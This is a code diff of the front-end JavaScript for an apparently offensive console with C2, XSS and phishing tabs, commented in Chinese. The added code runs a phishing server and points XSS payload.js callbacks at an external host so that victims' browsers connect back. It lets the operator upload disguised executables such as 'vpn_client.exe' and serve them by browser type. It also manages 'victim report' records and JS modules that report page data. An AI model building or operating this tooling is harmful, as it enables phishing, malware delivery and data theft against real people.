+{% if tab == 'c2' %}loadStatus();{% elif tab == 'xss' %}loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks();{% elif tab == 'phishing' %}loadPhStatus(); loadPhPages(); loadPhDownloads(); loadPhLinks();{% else %}loadWsConnections();{% endif %}
 
 // ══════════════════════ 钓鱼页面(phishing) ══════════════════════
 var phTimer = null;
@@ -2514,10 +2677,12 @@ async function loadPhStatus() {
     try {
         var d = await phFetch('/api/phishing/status');
         var st = d;
+        window.phStatusCache = st;   // 供下载物管理"上传文件"取活动页面
         document.getElementById('ph-running').textContent = st.running ? '运行中' : '已停止';
         document.getElementById('ph-running').style.color = st.running ? 'var(--success)' : 'var(--danger)';
         document.getElementById('ph-port').textContent = st.port || '-';
         document.getElementById('ph-modcount').textContent = st.module_count || 0;
+        updatePhToggle(!!st.running);
         var r2 = document.getElementById('ph-running2');
         if (r2) { r2.textContent = st.running ? '运行中' : '已停止'; r2.style.color = st.running ? 'var(--success)' : 'var(--danger)'; }
         var pc = document.getElementById('ph-pagecount');
@@ -2526,8 +2691,12 @@ async function loadPhStatus() {
         if (act) act.textContent = st.active_page || '-';
         var cfg2 = document.getElementById('ph-config2');
         if (cfg2) {
+            // 记录默认反连 host/port(构建表单占位用)
+            window.phDefaultHost = st.host && st.host !== '0.0.0.0' ? st.host : (window.location.hostname || '');
+            window.phDefaultPort = st.port || '';
             cfg2.innerHTML = (st.running ? '' : '<span style="color:var(--danger);">服务器未运行</span><br>') +
                 '端口: <b>' + (st.port || '-') + '</b><br>' +
+                '对外地址: <b>' + (window.phDefaultHost || '自动') + '</b><br>' +
                 '反连路由: <b>' + (st.route_payload || '-') + '</b><br>' +
                 '回传路由: <b>' + (st.route_report || '-') + '</b><br>' +
                 '当前页面: <b>' + (st.active_page || '-') + '</b><br>' +
@@ -2551,13 +2720,59 @@ function renderPhLinks(st) {
     if (!st.running) { box.innerHTML = '<span style="color:var(--text-muted);">服务器未运行</span>'; return; }
     var host = window.location.hostname || '127.0.0.1';
     var base = 'http://' + host + ':' + (st.port || '9100');
+    // 移除指定访问页面功能:只放行当前活动页面(/ 即 active_page),无 /page/<name> 链接
     var html = '<div style="margin-bottom:6px;">当前页面:</div>';
-    html += '<div style="margin-bottom:8px;"><a href="' + base + '/" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/</a></div>';
-    html += '<div style="margin-bottom:6px;">指定页面:</div>';
-    html += '<div style="margin-bottom:8px;"><a href="' + base + '/page/' + encodeURIComponent(st.active_page || 'login') + '" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/page/' + encodeURIComponent(st.active_page || 'login') + '</a></div>';
+    html += '<div style="margin-bottom:8px;"><a href="' + base + '/" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/</a> <span style="color:var(--text-muted);">(' + escapeHtml(st.active_page || '-') + ')</span></div>';
     html += '<div style="margin-bottom:6px;">JS 反连:</div>';
-    html += '<div><a href="' + base + '/payload.js?m=' + encodeURIComponent(st.default_module || 'hello') + '" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/payload.js?m=' + encodeURIComponent(st.default_module || 'hello') + '</a></div>';
+    // payload 链接带对外 host/port 参数(覆盖 127.0.0.1 默认,受害者浏览器回连到真实服务器)
+    var ph = (window.phDefaultHost || host);
+    var pp = (window.phDefaultPort || st.port || '');
+    html += '<div><a href="' + base + '/payload.js?m=' + encodeURIComponent(st.default_module || 'hello') + '&host=' + encodeURIComponent(ph) + '&port=' + encodeURIComponent(pp) + '" target="_blank" rel="noopener" style="color:var(--accent);">' + base + '/payload.js?m=' + encodeURIComponent(st.default_module || 'hello') + '&host=' + encodeURIComponent(ph) + '&port=' + encodeURIComponent(pp) + '</a></div>';
+    if (st.download_file) {
+        html += '<div style="margin-bottom:6px;margin-top:8px;">下载文件:</div>';
+        html += '<div><a href="' + base + '/download/' + encodeURIComponent(st.download_file) + '" style="color:var(--accent);">' + base + '/download/' + encodeURIComponent(st.download_file) + '</a></div>';
+    }
+    // 下载物列表(名称 ↔ 路径):展示所有条目,浏览器端按 UA 选择
+    if (window._phDownloads && window._phDownloads.length) {
+        html += '<div style="margin-bottom:6px;margin-top:8px;">下载物(' + window._phDownloads.length + '):</div>';
+        var shown = {};
+        window._phDownloads.forEach(function (d) {
+            var key = d.name + '|' + (d.ua || '*');
+            if (shown[key]) return;
+            shown[key] = 1;
+            var href = d.path.indexOf('/download/') === 0 ? base + d.path : d.path;
+            html += '<div style="margin-bottom:4px;"><span style="color:var(--text-muted);">[' + escapeHtml(d.ua || '通用') + ']</span> <a href="' + escapeHtml(href) + '" target="_blank" rel="noopener" style="color:var(--accent);">' + escapeHtml(d.name) + '</a> <span style="color:var(--text-faint);">→ ' + escapeHtml(href) + '</span></div>';
+        });
+    }
     box.innerHTML = html;
+}
+
+// 启动/停止 toggle 按钮:两个 tab(XSS 与钓鱼页面)共用,按 running 状态同步
+function updatePhToggle(running) {
+    ['ph-toggle-btn', 'ph-toggle-btn2'].forEach(function (id) {
+        var btn = document.getElementById(id);
+        if (!btn) return;
+        btn.textContent = running ? '停止' : '启动';
+        btn.className = 'btn btn-sm ' + (running ? 'btn-danger' : 'btn-primary');
+    });
+}
+
+async function togglePh() {
+    var btn = document.getElementById('ph-toggle-btn') || document.getElementById('ph-toggle-btn2');
+    if (!btn) return;
+    var running = btn.textContent === '停止';
+    if (running && !(await fs3Confirm('停止钓鱼/XSS 服务器？停止后需手动点「启动」恢复。确认停止？'))) return;
+    var label = running ? '停止' : '启动';
+    btn.textContent = label + '中...';
+    btn.disabled = true;
+    try {
+        var d = await phFetch(running ? '/api/phishing/stop' : '/api/phishing/start', {method: 'POST'});
+        loadPhStatus();
+    } catch (e) {
+        loadPhStatus();
+    } finally {
+        btn.disabled = false;
+    }
 }
 
 async function phStart() {
@@ -2575,11 +2790,12 @@ async function phStop() {
 }
 
 async function phRestart() {
-    if (!confirm('重启钓鱼服务器?')) return;
+    if (!(await fs3Confirm('重启钓鱼服务器?'))) return;
     try {
         var d = await phFetch('/api/phishing/restart', {method: 'POST'});
+        fs3Alert(d.message || '已重启');
         loadPhStatus();
-    } catch (e) {}
+    } catch (e) { fs3Alert('重启失败'); }
 }
 
 // ── JS 模块列表 / 参数表单 / 构建 ──
@@ -2659,16 +2875,31 @@ function phSelectModule(name) {
     hostRow.style.cssText = 'margin-bottom:10px;';
     var hl = document.createElement('label');
     hl.htmlFor = 'ph-param-host';
-    hl.textContent = '反连地址 host (留空=自动)';
+    hl.textContent = '反连地址 host (留空=自动)' + (window.phDefaultHost ? ' [' + window.phDefaultHost + ']' : '');
     hl.style.cssText = 'display:block;font-size:0.76rem;color:var(--text-muted);margin-bottom:4px;';
     var hin = document.createElement('input');
     hin.id = 'ph-param-host';
     hin.className = 'form-control';
-    hin.placeholder = '自动取服务器地址';
+    hin.placeholder = window.phDefaultHost || '自动取服务器地址';
     hin.style.cssText = 'font-family:var(--font-mono);font-size:0.78rem;';
     hostRow.appendChild(hl);
     hostRow.appendChild(hin);
     pbox.appendChild(hostRow);
+    // 反连端口(留空=服务器默认端口)
+    var portRow = document.createElement('div');
+    portRow.style.cssText = 'margin-bottom:10px;';
+    var pl = document.createElement('label');
+    pl.htmlFor = 'ph-param-port';
+    pl.textContent = '反连端口 port (留空=默认 ' + (window.phDefaultPort || '?') + ')';
+    pl.style.cssText = 'display:block;font-size:0.76rem;color:var(--text-muted);margin-bottom:4px;';
+    var pin = document.createElement('input');
+    pin.id = 'ph-param-port';
+    pin.className = 'form-control';
+    pin.placeholder = String(window.phDefaultPort || '');
+    pin.style.cssText = 'font-family:var(--font-mono);font-size:0.78rem;';
+    portRow.appendChild(pl);
+    portRow.appendChild(pin);
+    pbox.appendChild(portRow);
     var btn = document.createElement('button');
     btn.className = 'btn btn-primary btn-sm';
     btn.textContent = '构建预览';
@@ -2683,11 +2914,13 @@ async function phBuildPreview() {
     inputs.forEach(function(inp) { args[inp.getAttribute('data-param')] = inp.value; });
     var hostInp = document.getElementById('ph-param-host');
     var host = hostInp ? hostInp.value.trim() : '';
+    var portInp = document.getElementById('ph-param-port');
+    var port = portInp ? portInp.value.trim() : '';
     try {
         var d = await phFetch('/api/phishing/build', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({name: phSelectedModule, args: args, host: host})
+            body: JSON.stringify({name: phSelectedModule, args: args, host: host, port: port || undefined})
         });
         phBuildResult = d;
         document.getElementById('ph-preview').textContent = d.code || '';
@@ -2758,7 +2991,7 @@ async function loadPhPages() {
             html += '<div style="display:flex;gap:6px;margin-top:8px;padding-top:8px;border-top:1px dashed var(--border);">';
             if (!isActive) html += '<button class="btn btn-sm" style="flex:1;" onclick="phActivatePage(\'' + escapeHtml(p.name) + '\')">设为当前</button>';
             else html += '<span class="btn btn-sm" style="flex:1;cursor:default;opacity:0.6;background:transparent;border:1px solid var(--success);color:var(--success);">当前活动页</span>';
-            html += '<button class="btn btn-sm" style="flex:1;" onclick="phBrowsePage(\'' + escapeHtml(p.name) + '\')">文件</button>';
+            html += '<button class="btn btn-sm" style="flex:1;" onclick="phOpenFilesModal(\'' + escapeHtml(p.name) + '\')">文件管理</button>';
             html += '<button class="btn btn-sm" style="flex:1;" onclick="phDeletePage(\'' + escapeHtml(p.name) + '\')">删除</button>';
             html += '</div>';
             html += '</div>';
@@ -2777,61 +3010,298 @@ async function phActivatePage(name) {
     } catch (e) {}
 }
 
-function phBrowsePage(name) {
-    var content = prompt('页面 ' + name + ' 文件操作\n输入文件名(如 index.html / style.css / app.js)读取,留空取消:', 'index.html');
-    if (content === null) return;
-    var fname = content.trim();
-    if (!fname) return;
-    phEditPageFile(name, fname);
+// ══════════ 文件管理弹窗(统一居中模态框) ══════════
+var _phfmPage = '';   // 当前文件管理弹窗绑定的页面名
+
+function phOpenFilesModal(name) {
+    _phfmPage = name;
+    var modal = document.getElementById('ph-files-modal');
+    if (!modal) return;
+    document.getElementById('phfm-title').textContent = '文件管理 — ' + name;
+    document.getElementById('phfm-msg').textContent = '';
+    // fs3 类名 + 内联 !important 双保险(参照 AI 分析);打开用 JS 设 !important 覆盖
+    modal.style.setProperty('display', 'flex', 'important');
+    phfmRefresh();
 }
 
-async function phEditPageFile(name, fname) {
+function closePhFilesModal() {
+    var modal = document.getElementById('ph-files-modal');
+    if (modal) modal.style.setProperty('display', 'none', 'important');
+}
+
+async function phfmRefresh() {
+    var list = document.getElementById('phfm-list');
+    if (!list) return;
+    list.innerHTML = '<div style="color:var(--text-muted);padding:8px;">加载中...</div>';
     try {
-        var d = await phFetch('/api/phishing/page/' + encodeURIComponent(name) + '/file?path=' + encodeURIComponent(fname));
-        var newContent = prompt('编辑 ' + name + '/' + fname + '\n(内容会原样写回)', d.content || '');
+        var d = await phFetch('/api/phishing/page/' + encodeURIComponent(_phfmPage) + '/files');
+        var files = d.files || [];
+        if (!files.length) {
+            list.innerHTML = '<div style="color:var(--text-muted);padding:8px;">页面内暂无文件</div>';
+            return;
+        }
+        var html = '';
+        files.forEach(function (f) {
+            var isBin = /\.(exe|msi|dll|zip|bin|apk|appx|scr|bat|cmd|ps1|vbs|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i.test(f);
+            html += '<div style="display:flex;align-items:center;gap:8px;padding:6px 8px;border-bottom:1px solid var(--border);">';
+            html += '<span style="font-family:var(--font-mono);font-size:0.74rem;flex:1;">' + escapeHtml(f) + '</span>';
+            if (!isBin) {
+                html += '<button class="btn btn-sm" onclick="phfmEditFile(\'' + escapeHtml(f) + '\')" style="font-size:0.7rem;">编辑</button>';
+            } else {
+                html += '<span style="font-size:0.66rem;color:var(--text-faint);">二进制</span>';
+            }
+            html += '<button class="btn btn-sm" onclick="phfmDeleteFile(\'' + escapeHtml(f) + '\')" style="font-size:0.7rem;">删除</button>';
+            html += '</div>';
+        });
+        list.innerHTML = html;
+    } catch (e) {
+        list.innerHTML = '<div style="color:var(--danger);padding:8px;">加载失败</div>';
+    }
+}
+
+async function phfmEditFile(fname) {
+    try {
+        var d = await phFetch('/api/phishing/page/' + encodeURIComponent(_phfmPage) + '/file?path=' + encodeURIComponent(fname));
+        var newContent = await fs3Prompt('编辑 ' + _phfmPage + '/' + fname + '\n(内容会原样写回)', d.content || '', '', true);
         if (newContent === null) return;
-        var r = await phFetch('/api/phishing/page/' + encodeURIComponent(name) + '/file', {
+        var r = await phFetch('/api/phishing/page/' + encodeURIComponent(_phfmPage) + '/file', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({path: fname, content: newContent})
         });
-        alert(r.message || '已保存');
+        document.getElementById('phfm-msg').textContent = r.message || '已保存';
+        phfmRefresh();
     } catch (e) {}
 }
 
+async function phfmCreateFile() {
+    var fname = await fs3Prompt('新建文件(如 style.css / app.js / meta.json):', '', '文件名');
+    if (fname === null) return;
+    fname = (fname || '').trim();
+    if (!fname) return;
+    phfmEditFile(fname);
+}
+
+// 上传文件到弹窗绑定页面目录(支持二进制,base64 传输)
+async function phfmUploadFile() {
+    var fname = await fs3Prompt('上传到页面 ' + _phfmPage + ' 的文件名\n(如 vpn_client.exe):', 'vpn_client.exe', '文件名');
+    if (fname === null) return;
+    fname = (fname || '').trim();
+    if (!fname) return;
+    var fileInput = document.createElement('input');
+    fileInput.type = 'file';
+    fileInput.style.display = 'none';
+    document.body.appendChild(fileInput);
+    fileInput.addEventListener('change', function () {
+        var f = fileInput.files && fileInput.files[0];
+        document.body.removeChild(fileInput);
+        if (!f) return;
+        if (f.size > 10 * 1024 * 1024) { fs3Alert('文件过大(>10MB)'); return; }
+        var reader = new FileReader();
+        reader.onload = async function () {
+            var b64 = String(reader.result).split(',')[1] || '';
+            try {
+                var r = await phFetch('/api/phishing/page/' + encodeURIComponent(_phfmPage) + '/file', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({path: fname, content: 'FS3B64:' + b64})
+                });
+                document.getElementById('phfm-msg').textContent = r.message || '已上传';
+                phfmRefresh();
+                loadPhPages();
+            } catch (e) { fs3Alert('上传失败'); }
+        };
+        reader.readAsDataURL(f);
+    });
+    fileInput.click();
+}
+
+async function phfmDeleteFile(fname) {
+    if (!(await fs3Confirm('确认删除 ' + _phfmPage + '/' + fname + ' ?'))) return;
+    try {
+        var r = await phFetch('/api/phishing/page/' + encodeURIComponent(_phfmPage) + '/file?path=' + encodeURIComponent(fname), {
+            method: 'DELETE'
+        });
+        document.getElementById('phfm-msg').textContent = r.message || '已删除';
+        phfmRefresh();
+        loadPhPages();
+    } catch (e) {}
+}
+
+// 上传文件到共享下载目录(下载物管理卡片用;所有页面共用,不依赖活动页面)
+async function phUploadPageFile() {
+    var fname = await fs3Prompt('上传到共享下载目录的文件名\n(如 vpn_client.exe,所有页面可用;下载物 path 填 /download/vpn_client.exe)', 'vpn_client.exe', '文件名');
+    if (fname === null) return;
+    fname = (fname || '').trim();
+    if (!fname) return;
+    var fileInput = document.createElement('input');
+    fileInput.type = 'file';
+    fileInput.style.display = 'none';
+    document.body.appendChild(fileInput);
+    fileInput.addEventListener('change', function () {
+        var f = fileInput.files && fileInput.files[0];
+        document.body.removeChild(fileInput);
+        if (!f) return;
+        if (f.size > 10 * 1024 * 1024) { fs3Alert('文件过大(>10MB)'); return; }
+        var reader = new FileReader();
+        reader.onload = async function () {
+            var b64 = String(reader.result).split(',')[1] || '';
+            try {
+                var r = await phFetch('/api/phishing/downloads/files', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({filename: fname, content: 'FS3B64:' + b64})
+                });
+                fs3Alert(r.message || '已上传');
+                loadPhDownloads();
+                loadPhStatus();
+            } catch (e) { fs3Alert('上传失败'); }
+        };
+        reader.readAsDataURL(f);
+    });
+    fileInput.click();
+}
+
 async function phCreatePage() {
-    var name = prompt('新页面文件夹名(字母/数字/_/-):', '');
-    if (!name) return;
-    name = name.trim();
-    if (!/^[A-Za-z0-9_-]+$/.test(name)) { alert('页面名只允许字母/数字/下划线/短横线'); return; }
-    var desc = prompt('页面描述(可选):', '') || '';
+    var name = await fs3Prompt('新页面文件夹名(字母/数字/_/-):', '', '页面名');
+    if (name === null) return;
+    name = (name || '').trim();
+    if (!/^[A-Za-z0-9_-]+$/.test(name)) { fs3Alert('页面名只允许字母/数字/下划线/短横线'); return; }
+    var desc = await fs3Prompt('页面描述(可选):', '', '描述');
+    if (desc === null) return;
     try {
         var d = await phFetch('/api/phishing/page/create', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({name: name, desc: desc})
+            body: JSON.stringify({name: name, desc: desc || ''})
         });
         loadPhPages();
+    } catch (e) { fs3Alert('创建失败'); }
+}
+
+// ══════════ 下载物管理(名称 ↔ 路径/网址 + UA 匹配) ══════════
+var _phDownloads = [];
+
+async function loadPhDownloads() {
+    try {
+        var d = await phFetch('/api/phishing/downloads');
+        _phDownloads = (d.downloads || []).slice();
+        renderPhDownloads();
+    } catch (e) {}
+    loadPhDlFiles();
+}
+
+function renderPhDownloads() {
+    var box = document.getElementById('ph-downloads');
+    if (!box) return;
+    var uas = [['', '通用'], ['chrome', 'Chrome'], ['firefox', 'Firefox'], ['edge', 'Edge'], ['safari', 'Safari']];
+    var html = '';
+    if (!_phDownloads.length) {
+        html += '<div style="color:var(--text-muted);margin-bottom:6px;">暂无下载物,点「添加」新建</div>';
+    }
+    _phDownloads.forEach(function (dl, i) {
+        html += '<div style="display:flex;gap:4px;margin-bottom:4px;align-items:center;">';
+        html += '<input class="form-control" data-dl-name="' + i + '" value="' + escapeHtml(dl.name || '') + '" placeholder="名称" style="width:24%;font-size:0.7rem;" aria-label="下载物名称">';
+        html += '<input class="form-control" data-dl-path="' + i + '" value="' + escapeHtml(dl.path || '') + '" placeholder="/download/x.exe 或 https://..." style="flex:1;font-size:0.7rem;" aria-label="下载物路径">';
+        html += '<select class="form-control" data-dl-ua="' + i + '" style="width:17%;font-size:0.7rem;" aria-label="浏览器匹配">';
+        uas.forEach(function (u) {
+            html += '<option value="' + u[0] + '"' + ((dl.ua || '') === u[0] ? ' selected' : '') + '>' + u[1] + '</option>';
+        });
+        html += '</select>';
+        html += '<button class="btn btn-sm" onclick="phDelDownload(' + i + ')" title="删除该下载物" style="font-size:0.7rem;">删</button>';
+        html += '</div>';
+    });
+    html += '<div style="display:flex;gap:4px;margin-top:6px;">';
+    html += '<button class="btn btn-sm btn-primary" onclick="phSaveDownloads()" style="font-size:0.72rem;">保存全部</button>';
+    html += '<button class="btn btn-sm" onclick="phAddDownload()" style="font-size:0.72rem;">+ 添加</button>';
+    html += '</div>';
+    // 共享下载目录文件(所有页面共用)
+    html += '<div style="margin-top:10px;padding-top:8px;border-top:1px dashed var(--border);">';
+    html += '<div style="font-size:0.7rem;color:var(--text-muted);margin-bottom:4px;">共享目录文件(所有页面可用,path 填 /download/文件名):</div>';
+    if (_phDlFiles && _phDlFiles.length) {
+        _phDlFiles.forEach(function (f) {
+            html += '<div style="display:flex;align-items:center;gap:6px;padding:3px 0;font-size:0.7rem;">';
+            html += '<span style="font-family:var(--font-mono);flex:1;">' + escapeHtml(f) + '</span>';
+            html += '<button class="btn btn-sm" onclick="phDlFileDelete(\'' + escapeHtml(f) + '\')" style="font-size:0.66rem;">删</button>';
+            html += '</div>';
+        });
+    } else {
+        html += '<div style="color:var(--text-faint);font-size:0.68rem;">暂无,点上方「上传文件」上传</div>';
+    }
+    html += '</div>';
+    box.innerHTML = html;
+}
+
+var _phDlFiles = [];
+
+async function loadPhDlFiles() {
+    try {
+        var d = await phFetch('/api/phishing/downloads/files');
+        _phDlFiles = (d.files || []).slice();
+        renderPhDownloads();
     } catch (e) {}
 }
 
+async function phDlFileDelete(f) {
+    if (!(await fs3Confirm('确认删除共享目录文件 ' + f + ' ?'))) return;
+    try {
+        var r = await phFetch('/api/phishing/downloads/files?filename=' + encodeURIComponent(f), {method: 'DELETE'});
+        fs3Alert(r.message || '已删除');
+        loadPhDlFiles();
+    } catch (e) {}
+}
+
+function phAddDownload() {
+    _phDownloads.push({name: '', path: '', ua: ''});
+    renderPhDownloads();
+}
+
+function phDelDownload(i) {
+    _phDownloads.splice(i, 1);
+    renderPhDownloads();
+}
+
+async function phSaveDownloads() {
+    var out = [];
+    document.querySelectorAll('#ph-downloads [data-dl-name]').forEach(function (inp) {
+        var i = inp.getAttribute('data-dl-name');
+        var pathEl = document.querySelector('#ph-downloads [data-dl-path="' + i + '"]');
+        var uaEl = document.querySelector('#ph-downloads [data-dl-ua="' + i + '"]');
+        var name = (inp.value || '').trim();
+        var path = (pathEl ? pathEl.value : '').trim();
+        var ua = uaEl ? uaEl.value : '';
+        if (name && path) out.push({name: name, path: path, ua: ua});
+    });
+    try {
+        var r = await phFetch('/api/phishing/downloads', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({downloads: out})
+        });
+        fs3Alert(r.message || '已保存');
+        loadPhDownloads();
+        loadPhStatus();
+    } catch (e) { fs3Alert('保存失败'); }
+}
+
 async function phDeletePage(name) {
-    if (!confirm('删除页面 ' + name + '?')) return;
+    if (!(await fs3Confirm('删除页面 ' + name + '?'))) return;
     try {
         var d = await phFetch('/api/phishing/page/' + encodeURIComponent(name), {method: 'DELETE'});
+        fs3Alert(d.message || '已删除');
         loadPhPages();
-    } catch (e) {}
+    } catch (e) { fs3Alert('删除失败'); }
 }
 
 // ── 模块增删 ──
 
-function phAddModule() {
-    var filename = prompt('新 JS 模块文件名(如 mymod.js):', '');
-    if (!filename) return;
-    filename = filename.trim();
-    if (!filename.endsWith('.js')) { alert('必须以 .js 结尾'); return; }
-    var content = prompt('模块内容(必须含 // MODULE = {...} 元数据头):',
-        '// MODULE = {"desc": "模块描述", "params": [["param1", "默认 xxx"]]}\n(function () {\n  report({type: "custom", url: location.href});\n})();');
+async function phAddModule() {
+    var filename = await fs3Prompt('新 JS 模块文件名(如 mymod.js):', '', '文件名');
+    if (filename === null) return;
+    filename = (filename || '').trim();
+    if (!filename.endsWith('.js')) { fs3Alert('必须以 .js 结尾'); return; }
+    var content = await fs3Prompt('模块内容(必须含 // MODULE = {...} 元数据头):',
+        '// MODULE = {"desc": "模块描述", "params": [["param1", "默认 xxx"]]}\n(function () {\n  report({type: "custom", url: location.href});\n})();', 'JS 代码', true);
     if (content === null) return;
     phSaveModule(filename, content);
 }
@@ -2843,16 +3313,18 @@ async function phSaveModule(filename, content) {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({filename: filename, content: content})
         });
+        fs3Alert(d.message || (d.ok ? '已保存' : '保存失败'));
         loadPhModules();
-    } catch (e) {}
+    } catch (e) { fs3Alert('保存失败'); }
 }
 
 async function phDeleteModule(name) {
-    if (!confirm('删除 JS 模块 ' + name + '.js?')) return;
+    if (!(await fs3Confirm('删除 JS 模块 ' + name + '.js?'))) return;
     try {
         var d = await phFetch('/api/phishing/module/' + encodeURIComponent(name + '.js'), {method: 'DELETE'});
+        fs3Alert(d.message || '已删除');
         loadPhModules();
-    } catch (e) {}
+    } catch (e) { fs3Alert('删除失败'); }
 }
 
 // ── 受害记录 ──
@@ -2920,11 +3392,12 @@ async function loadPhReports() {
 }
 
 async function phClearReports() {
-    if (!confirm('清空全部受害回传记录?')) return;
+    if (!(await fs3Confirm('清空全部受害回传记录?'))) return;
     try {
         var d = await phFetch('/api/phishing/reports/clear', {method: 'POST'});
+        fs3Alert(d.message || '已清空');
         loadPhReports();
-    } catch (e) {}
+    } catch (e) { fs3Alert('清空失败'); }
 }
 
 // ── 配置 ──
@@ -2940,7 +3413,8 @@ async function loadPhConfig() {
             {k: 'port', label: '监听端口', type: 'number', def: st.port || 9100},
             {k: 'route_payload', label: 'JS 路由', type: 'text', def: st.route_payload || '/payload.js'},
             {k: 'route_report', label: '回传路由', type: 'text', def: st.route_report || '/report'},
-            {k: 'default_module', label: '默认模块', type: 'text', def: st.default_module || 'hello'}
+            {k: 'default_module', label: '默认模块', type: 'text', def: st.default_module || 'hello'},
+            {k: 'download_file', label: '下载文件(页面按钮下载的二进制,位于当前页面目录)', type: 'text', def: st.download_file || ''}
         ];
         fields.forEach(function(f, i) {
             var row = document.createElement('div');
@@ -2983,9 +3457,9 @@ async function phSaveConfig() {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(updates)
         });
-        alert(d.message || '已保存');
+        fs3Alert(d.message || '已保存');
         loadPhStatus();
-    } catch (e) {}
+    } catch (e) { fs3Alert('保存失败'); }
 }
 
 // ── 审计 ──
